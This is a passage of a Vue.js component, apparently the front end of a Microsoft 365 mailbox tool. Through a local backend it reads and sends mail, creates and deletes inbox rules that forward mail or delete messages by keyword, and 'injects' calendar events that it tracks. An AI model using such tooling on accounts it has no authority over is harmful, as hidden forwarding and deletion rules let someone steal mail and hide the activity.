  { id: 'sentitems', name: 'Sent', icon: '📤', count: 0, children: [] },
  { id: 'drafts', name: 'Drafts', icon: '📝', count: 0, children: [] },
  { id: 'deleteditems', name: 'Deleted', icon: '🗑️', count: 0, children: [] },
  { id: 'junkemail', name: 'Junk', icon: '🚫', count: 0, children: [] }
])

// Cache system (3 minutes TTL)
const CACHE_TTL = 3 * 60 * 1000 // 3 minutes in milliseconds
const emailCache = ref({}) // { 'inbox': { data: [...], timestamp: ... }, ... }

// ===== NEW DATA: RULES & CALENDAR =====
const rules = ref([])
const creatingRule = ref(false)
const newRule = ref({
  ruleType: 'forward',
  displayName: '',
  forwardTo: '',
  keywordsStr: '',
  moveToFolder: ''
})

const events = ref([])
const creatingEvent = ref(false)
const selectedEvent = ref(null)
const showAllEvents = ref(true) // Toggle: true = all events, false = injected only

// Calendar View state
const calendarSubTab = ref('view') // 'view' or 'injection'
const currentMonth = ref(new Date().getMonth()) // 0-11
const currentYear = ref(new Date().getFullYear())
const selectedDay = ref(null)

// localStorage tracking for injected events
const injectedEventIds = ref([])

// Events cache (3 minutes TTL, same as emails/files)
const eventsCache = ref({ data: null, timestamp: null })

const newEvent = ref({
  subject: '',
  start: '',
  end: '',
  body: '',
  location: '',
  attendeesStr: ''
})

// Filtered events based on toggle
const filteredEvents = computed(() => {
  if (showAllEvents.value) {
    return events.value // Show all events (real + injected)
  } else {
    return events.value.filter(e => e.isOrganizer) // Show only injected (user is organizer)
  }
})

const injectedEventsCount = computed(() => {
  return events.value.filter(e => e.isOrganizer).length
})

const realEventsCount = computed(() => {
  return events.value.filter(e => !e.isOrganizer).length
})

// Calendar computed properties
const currentMonthName = computed(() => {
  const months = ['January', 'February', 'March', 'April', 'May', 'June', 
                  'July', 'August', 'September', 'October', 'November', 'December']
  return months[currentMonth.value]
})

const injectedEvents = computed(() => {
  return events.value.filter(e => isEventInjected(e.id))
})

const calendarDays = computed(() => {
  return generateCalendarDays(currentMonth.value, currentYear.value)
})

// ===== EXISTING METHODS (NOT TOUCHED) =====

// Cache helper function
const isCacheValid = (cacheEntry) => {
  if (!cacheEntry || !cacheEntry.timestamp) {
    return false
  }
  const age = Date.now() - cacheEntry.timestamp
  return age < CACHE_TTL
}

const loadFolders = async () => {
  try {
    const response = await fetch('http://localhost:5000/api/emails/folders/recursive')
    const data = await response.json()
    
    if (data.success && data.folders) {
      allFolders.value = data.folders
      
      // Flatten all folders for dropdown (used in Move Rule)
      const flattenFolders = (folders, prefix = '') => {
        let flat = []
        folders.forEach(folder => {
          const displayPath = prefix ? `${prefix} > ${folder.displayName}` : folder.displayName
          flat.push({
            id: folder.id,
            displayName: folder.displayName,
            displayPath: displayPath,
            count: folder.totalItemCount || 0
          })
          if (folder.children && folder.children.length > 0) {
            flat = flat.concat(flattenFolders(folder.children, displayPath))
          }
        })
        return flat
      }
      
      allFoldersFlat.value = flattenFolders(data.folders)
      
      // DEBUG: Log all folders returned by API
      console.log('[DEBUG] Total folders from API:', data.folders.length)
      console.log('[DEBUG] Folders:', data.folders.map(f => ({
        id: f.id,
        displayName: f.displayName,
        totalItemCount: f.totalItemCount
      })))
      
      // Map displayName to common folders
      const folderNameMap = {
        'inbox': ['inbox', 'posta in arrivo', 'boîte de réception'],
        'sentitems': ['sent items', 'posta inviata', 'éléments envoyés', 'sent mail'],
        'drafts': ['drafts', 'bozze', 'brouillons'],
        'deleteditems': ['deleted items', 'deleted', 'trash', 'bin', 'posta eliminata', 'elementi eliminati', 'éléments supprimés', 'corbeille', 'papierkorb'],
        'junkemail': ['junk email', 'junk', 'posta indesiderata', 'courrier indésirable', 'spam']
      }
      
      // Update counts and children for common folders
      commonFolders.value.forEach(folder => {
        // Try to find by well-known name first, then by displayName
        let apiFolder = data.folders.find(f => f.id.toLowerCase() === folder.id.toLowerCase())
        
        if (!apiFolder) {
          // Try matching by displayName
          const possibleNames = folderNameMap[folder.id] || []
          apiFolder = data.folders.find(f => {
            const displayName = f.displayName.toLowerCase()
            return possibleNames.some(name => displayName.includes(name))
          })
          
          // Debug: log search attempt for deleteditems
          if (folder.id === 'deleteditems' && !apiFolder) {
            console.log('[DEBUG Deleted] Searching with names:', possibleNames)
            console.log('[DEBUG Deleted] Available folder names:', data.folders.map(f => f.displayName.toLowerCase()))
          }
        }
        
        if (apiFolder) {
          folder.count = apiFolder.totalItemCount || 0
          folder.apiId = apiFolder.id // Store actual API ID for API calls
          folder.children = apiFolder.children || []
          
          // Debug log for Deleted folder count
          if (folder.id === 'deleteditems') {
            console.log('[✓ Deleted Folder FOUND]')
            console.log('  - API Folder ID:', apiFolder.id)
            console.log('  - Display Name:', apiFolder.displayName)
            console.log('  - totalItemCount:', apiFolder.totalItemCount)
            console.log('  - Assigned count:', folder.count)
          }
        } else {
          // Debug: folder not found
          if (folder.id === 'deleteditems') {
            console.error('[✗ Deleted Folder NOT FOUND in API response]')
          }
        }
      })
    }
  } catch (err) {
    console.warn('Could not load folders:', err)
  }
}

const selectFolder = (folderId) => {
  currentFolder.value = folderId
  
  if (folderId === 'rules') {
    loadRules()
  } else if (folderId === 'calendar') {
    loadEvents()
  } else {
    loadEmails()
  }
}

const toggleFolder = (folderId) => {
  expandedFolders.value[folderId] = !expandedFolders.value[folderId]
}

const refreshCurrentView = () => {
  if (currentFolder.value === 'rules') {
    loadRules()
  } else if (currentFolder.value === 'calendar') {
    loadEvents(true) // forceRefresh = true, bypass cache
  } else {
    loadEmails(true) // forceRefresh = true, bypass cache
  }
}

const loadEmails = async (forceRefresh = false) => {
  const folderId = currentFolder.value
  
  // Check cache first (3 min TTL) - skip if forceRefresh
  if (!forceRefresh && emailCache.value[folderId] && isCacheValid(emailCache.value[folderId])) {
    console.log(`[CACHE] Using cached emails for folder: ${folderId}`)
    emails.value = emailCache.value[folderId].data
    return
  }
  
  loading.value = true
  error.value = null
  isSearching.value = false

  try {
    const response = await fetch(`http://localhost:5000/api/emails?top=20&folder=${encodeURIComponent(folderId)}`)
    const data = await response.json()

    if (data.success) {
      emails.value = data.messages || []
      
      // Update cache
      emailCache.value[folderId] = {
        data: emails.value,
        timestamp: Date.now()
      }
      console.log(`[CACHE] Emails cached for folder: ${folderId}`)
    } else {
      error.value = data.error
    }
  } catch (err) {
    error.value = 'Failed to load emails'
  } finally {
    loading.value = false
  }
}

const searchEmails = async () => {
  if (!searchQuery.value.trim()) return

  loading.value = true
  error.value = null
  isSearching.value = true

  try {
    const response = await fetch(`http://localhost:5000/api/emails/search?q=${encodeURIComponent(searchQuery.value)}`)
    const data = await response.json()

    if (data.success) {
      emails.value = data.messages || []
    } else {
      error.value = data.error
    }
  } catch (err) {
    error.value = 'Search failed'
  } finally {
    loading.value = false
  }
}

const clearSearch = () => {
  searchQuery.value = ''
  isSearching.value = false
  loadEmails()
}

const openEmail = (emailId) => {
  router.push(`/emails/${emailId}`)
}

const sendEmail = async () => {
  if (!composeData.value.to || !composeData.value.subject || !composeData.value.body) {
    sendError.value = 'Please fill all fields'
    return
  }

  sending.value = true
  sendError.value = null
  sendSuccess.value = false

  try {
    const response = await fetch('http://localhost:5000/api/emails/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(composeData.value)
    })

    const data = await response.json()

    if (data.success) {
      sendSuccess.value = true
      setTimeout(() => {
        closeCompose()
        loadEmails()
      }, 2000)
    } else {
      sendError.value = data.error
    }
  } catch (err) {
    sendError.value = 'Failed to send email'
  } finally {
    sending.value = false
  }
}

const closeCompose = () => {
  if (!sending.value) {
    showCompose.value = false
    composeData.value = { to: '', subject: '', body: '' }
    sendError.value = null
    sendSuccess.value = false
  }
}

// ===== NEW METHODS: RULES =====

const loadRules = async () => {
  loading.value = true
  error.value = null

  try {
    const response = await fetch('http://localhost:5000/api/emails/rules')
    const data = await response.json()

    if (data.success) {
      rules.value = data.rules || []
    } else {
      // Check if it's a permissions error
      if (data.error?.includes('403') || data.details?.includes('ErrorAccessDenied')) {
        error.value = '⚠️ Missing permissions: MailboxSettings.ReadWrite or Mail.ReadWrite required'
      } else {
        error.value = data.error
      }
    }
  } catch (err) {
    error.value = 'Failed to load rules'
  } finally {
    loading.value = false
  }
}

const createRule = async () => {
  if (!newRule.value.displayName) {
    alert('Please enter a display name')
    return
  }

  if (newRule.value.ruleType === 'forward' && !newRule.value.forwardTo) {
    alert('Please enter forward email address')
    return
  }

  if ((newRule.value.ruleType === 'delete' || newRule.value.ruleType === 'move') && !newRule.value.keywordsStr) {
    alert('Please enter keywords')
    return
  }

  creatingRule.value = true

  try {
    const ruleData = {
      ruleType: newRule.value.ruleType,
      displayName: newRule.value.displayName
    }

    if (newRule.value.ruleType === 'forward') {
      ruleData.forwardTo = newRule.value.forwardTo
    }

    if (newRule.value.ruleType === 'delete' || newRule.value.ruleType === 'move') {
      ruleData.keywords = newRule.value.keywordsStr.split(',').map(k => k.trim()).filter(Boolean)
    }

    if (newRule.value.ruleType === 'move') {
      ruleData.moveToFolder = newRule.value.moveToFolder || 'Junk Email'
    }

    const response = await fetch('http://localhost:5000/api/emails/rules', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(ruleData)
    })

    const data = await response.json()

    if (data.success) {
      alert('✅ Rule created successfully!')
      newRule.value = {
        ruleType: 'forward',
        displayName: '',
        forwardTo: '',
        keywordsStr: '',
        moveToFolder: ''
      }
      loadRules()
    } else {
      alert(`❌ Error: ${data.error}`)
    }
  } catch (err) {
    alert(`❌ Error: ${err.message}`)
  } finally {
    creatingRule.value = false
  }
}

const deleteRule = async (ruleId) => {
  if (!confirm('Delete this rule?')) return

  try {
    const response = await fetch(`http://localhost:5000/api/emails/rules/${ruleId}`, {
      method: 'DELETE'
    })

    const data = await response.json()

    if (data.success) {
      alert('✅ Rule deleted')
      loadRules()
    } else {
      alert(`❌ Error: ${data.error}`)
    }
  } catch (err) {
    alert(`❌ Error: ${err.message}`)
  }
}

const deleteAllRules = async () => {
  if (!confirm(`Delete all ${rules.value.length} rules?`)) return

  for (const rule of rules.value) {
    await deleteRule(rule.id)
  }
}

// ===== NEW METHODS: CALENDAR =====

// localStorage functions for tracking injected events
const saveInjectedEventIds = () => {
  localStorage.setItem('specterportal_injected_events', JSON.stringify(injectedEventIds.value))
}

const loadInjectedEventIds = () => {
  try {
    const stored = localStorage.getItem('specterportal_injected_events')
    if (stored) {
      injectedEventIds.value = JSON.parse(stored)
    }
  } catch (err) {
    console.error('Failed to load injected event IDs:', err)
    injectedEventIds.value = []
  }
}

const isEventInjected = (eventId) => {
  return injectedEventIds.value.includes(eventId)
}

const addInjectedEventId = (eventId) => {
  if (!injectedEventIds.value.includes(eventId)) {
    injectedEventIds.value.push(eventId)
    saveInjectedEventIds()
  }
}

const removeInjectedEventId = (eventId) => {
  const index = injectedEventIds.value.indexOf(eventId)
  if (index > -1) {
    injectedEventIds.value.splice(index, 1)
    saveInjectedEventIds()
  }
}

// Calendar navigation functions
const changeMonth = (direction) => {
  currentMonth.value += direction
  if (currentMonth.value > 11) {
    currentMonth.value = 0
    currentYear.value++
  } else if (currentMonth.value < 0) {
    currentMonth.value = 11
    currentYear.value--
  }
  selectedDay.value = null // Clear selection when changing month
}

const selectDay = (day) => {
  if (day.isCurrentMonth) {
    selectedDay.value = day
  }
}

const generateCalendarDays = (month, year) => {
  const firstDay = new Date(year, month, 1)
  const lastDay = new Date(year, month + 1, 0)
  const daysInMonth = lastDay.getDate()
  
  console.log('[DEBUG] Generating calendar for month:', month, 'year:', year)
  console.log('[DEBUG] Total events available:', events.value.length)
  
  // Get day of week for first day (0 = Sunday, 1 = Monday, ...)
  let firstDayOfWeek = firstDay.getDay()
  // Convert to Monday = 0, Sunday = 6
  firstDayOfWeek = firstDayOfWeek === 0 ? 6 : firstDayOfWeek - 1
  
  const days = []
  const today = new Date()
  today.setHours(0, 0, 0, 0)
  
  // Previous month days
  const prevMonthLastDay = new Date(year, month, 0).getDate()
  for (let i = firstDayOfWeek - 1; i >= 0; i--) {
    const dayNumber = prevMonthLastDay - i
    const date = new Date(year, month - 1, dayNumber)
    days.push({
      dayNumber,
      date,
      isCurrentMonth: false,
      isToday: false,
      events: []
    })
  }
  
  // Current month days
  for (let i = 1; i <= daysInMonth; i++) {
    const date = new Date(year, month, i)
    const isToday = date.getTime() === today.getTime()
    
    // Get events for this day
    const dayEvents = events.value.filter(event => {
      // Handle different date formats from Microsoft Graph API
      let eventDateStr
      if (typeof event.start === 'string') {
        eventDateStr = event.start
      } else if (event.start && event.start.dateTime) {
        // DateTimeTimeZone format: { dateTime: "2025-12-10T10:00:00", timeZone: "UTC" }
        eventDateStr = event.start.dateTime
      } else {
        console.warn('[DEBUG] Invalid event start format:', event.start, 'for event:', event.subject)
        return false
      }
      
      const eventDate = new Date(eventDateStr)
      
      // Validate date
      if (isNaN(eventDate.getTime())) {
        console.error('[DEBUG] Invalid date parsed:', eventDateStr, 'for event:', event.subject)
        return false
      }
      
      const matches = eventDate.getFullYear() === year &&
             eventDate.getMonth() === month &&
             eventDate.getDate() === i
      
      if (matches) {
        console.log('[DEBUG] Event matched for day', i, ':', event.subject, 'Start:', eventDateStr, 'Parsed:', eventDate)
      }
      
      return matches
    })
    
    days.push({
      dayNumber: i,
      date,
      isCurrentMonth: true,
      isToday,
      events: dayEvents
    })
  }
  
  console.log('[DEBUG] Total days generated with events:', days.filter(d => d.events.length > 0).length)
  
  // Next month days to fill grid (always 6 rows = 42 cells)
  const remainingCells = 42 - days.length
  for (let i = 1; i <= remainingCells; i++) {
    const date = new Date(year, month + 1, i)
    days.push({
      dayNumber: i,
      date,
      isCurrentMonth: false,
      isToday: false,
      events: []
    })
  }
  
  return days
}

const loadEvents = async (forceRefresh = false) => {
  // Check cache (skip if forceRefresh)
  if (!forceRefresh && eventsCache.value.data && isCacheValid(eventsCache.value)) {
    console.log('[CACHE] Using cached events')
    events.value = eventsCache.value.data
    return
  }

  console.log('[API] Fetching events from server', forceRefresh ? '(forced refresh)' : '')
  loading.value = true
  error.value = null

  try {
    const response = await fetch('http://localhost:5000/api/emails/calendar/events?days=30')
    const data = await response.json()

    console.log('[DEBUG] Calendar API Response:', data)
    
    if (data.success) {
      events.value = data.events || []
      
      console.log('[DEBUG] Events loaded:', events.value.length)
      if (events.value.length > 0) {
        console.log('[DEBUG] First event:', events.value[0])
        console.log('[DEBUG] First event start:', events.value[0].start, 'Type:', typeof events.value[0].start)
      }
      
      // Update cache
      eventsCache.value = {
        data: events.value,
        timestamp: Date.now()
      }
      console.log('[CACHE] Events cached:', events.value.length, 'events')
    } else {
      error.value = data.error
      console.log('[DEBUG] API returned error:', data.error)
    }
  } catch (err) {
    error.value = 'Failed to load calendar events'
    console.error('[DEBUG] Failed to load events:', err)
  } finally {
    loading.value = false
  }
}

const createEvent = async () => {
  if (!newEvent.value.subject || !newEvent.value.start || !newEvent.value.end) {
    alert('Please fill subject, start, and end time')
    return
  }

  creatingEvent.value = true

  try {
    const eventData = {
      subject: newEvent.value.subject,
      start: newEvent.value.start,
      end: newEvent.value.end,
      body: newEvent.value.body,
      location: newEvent.value.location,
      attendees: newEvent.value.attendeesStr.split(',').map(e => e.trim()).filter(Boolean)
    }

    const response = await fetch('http://localhost:5000/api/emails/calendar/events', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(eventData)
    })

    const data = await response.json()

    if (data.success) {
      // Track this event as injected in localStorage
      if (data.event && data.event.id) {
        addInjectedEventId(data.event.id)
        console.log('[INJECTED] Event tracked:', data.event.id)
      }
      
      alert('✅ Event created successfully!')
      newEvent.value = {
        subject: '',
        start: '',
        end: '',
        body: '',
        location: '',
        attendeesStr: ''
      }
      loadEvents(true) // forceRefresh = true, bypass cache after creation
    } else {
      alert(`❌ Error: ${data.error}`)
    }
  } catch (err) {
    alert(`❌ Error: ${err.message}`)
  } finally {
    creatingEvent.value = false
  }
}

const deleteEvent = async (eventId) => {
  if (!confirm('Delete this event?')) return

  try {
    const response = await fetch(`http://localhost:5000/api/emails/calendar/events/${eventId}`, {
      method: 'DELETE'
    })

    const data = await response.json()

    if (data.success) {
      // Remove from injected tracking
      removeInjectedEventId(eventId)
      console.log('[INJECTED] Event removed from tracking:', eventId)
      
      alert('✅ Event deleted')
      loadEvents(true) // forceRefresh = true, bypass cache after deletion
    } else {
      alert(`❌ Error: ${data.error}`)
    }
  } catch (err) {
    alert(`❌ Error: ${err.message}`)
  }
}

const viewEventDetails = (event) => {
  selectedEvent.value = event
  
  // DEBUG: Log event body details
  console.log('=== EVENT DETAILS DEBUG ===')
  console.log('Event ID:', event.id)
  console.log('Subject:', event.subject)
  console.log('Body type:', typeof event.body)
  console.log('Body length:', event.body ? event.body.length : 0)
  console.log('Body content (first 500 chars):', event.body ? event.body.substring(0, 500) : 'EMPTY')
  
  // Check for images in body
  if (event.body) {
    const imgMatches = event.body.match(/<img[^>]+>/g)
    console.log('Images found in body:', imgMatches ? imgMatches.length : 0)
    if (imgMatches) {
      console.log('Image tags:', imgMatches)
    }
  }
  console.log('========================')
}

// Process event body to handle cid: images
const deleteEventFromModal = async (eventId) => {
  // Close modal first
  selectedEvent.value = null
  
  // Then delete event
  await deleteEvent(eventId)
}

const formatDateTime = (dateInput) => {
  if (!dateInput) return 'N/A'
  
  // Handle different date formats from Microsoft Graph API
  let dateStr
  if (typeof dateInput === 'string') {
    dateStr = dateInput
  } else if (dateInput && dateInput.dateTime) {
    // DateTimeTimeZone format: { dateTime: "2025-12-10T10:00:00", timeZone: "UTC" }
    dateStr = dateInput.dateTime
  } else {
    console.warn('[DEBUG] Invalid date format in formatDateTime:', dateInput)
    return 'Invalid Date'
  }
  
  const date = new Date(dateStr)
  
  if (isNaN(date.getTime())) {
    console.error('[DEBUG] Invalid date parsed in formatDateTime:', dateStr)
    return 'Invalid Date'
  }
  
  return date.toLocaleString('en-US', { 
    month: 'short', 
    day: 'numeric', 
    hour: '2-digit', 
    minute: '2-digit' 
  })
}

onMounted(async () => {
  // Load injected event IDs from localStorage
  loadInjectedEventIds()
  
  await loadFolders()
  await loadEmails()
})

// Called when component is reactivated from keep-alive cache
onActivated(async () => {
  // loadEmails() will use cache if valid (< 3 min), or fetch fresh data if expired
  await loadEmails()
})
</script>

<style scoped>
.btn {
  @apply px-4 py-2 rounded-lg font-semibold transition-colors;
}

.btn-primary {
  @apply bg-blue-600 text-white hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed;
}

.btn-secondary {
  @apply bg-gray-600 text-white hover:bg-gray-700;
}

.btn-secondary-dark {
  @apply bg-gray-700 text-gray-300 hover:bg-gray-600;
}

/* Event body content styling - support for images and HTML */
.event-body-content {
  /* Force images to be visible and responsive */
  & img {
    max-width: 100% !important;
    height: auto !important;
    display: block !important;
    margin: 8px 0 !important;
    border-radius: 4px;
  }
  
  /* Ensure content is visible */
  & * {
    max-width: 100%;
  }
  
  /* Handle broken images */
  & img:not([src]), 
  & img[src=""],
  & img[src*="data:image/"] {
    display: block;
    min-height: 100px;
    background: #e0e0e0;
    position: relative;
  }
  
  /* Style for paragraphs and text */
  & p {
    margin: 8px 0;
  }
  
  & a {
    color: #3b82f6;
    text-decoration: underline;
  }
}
</style>
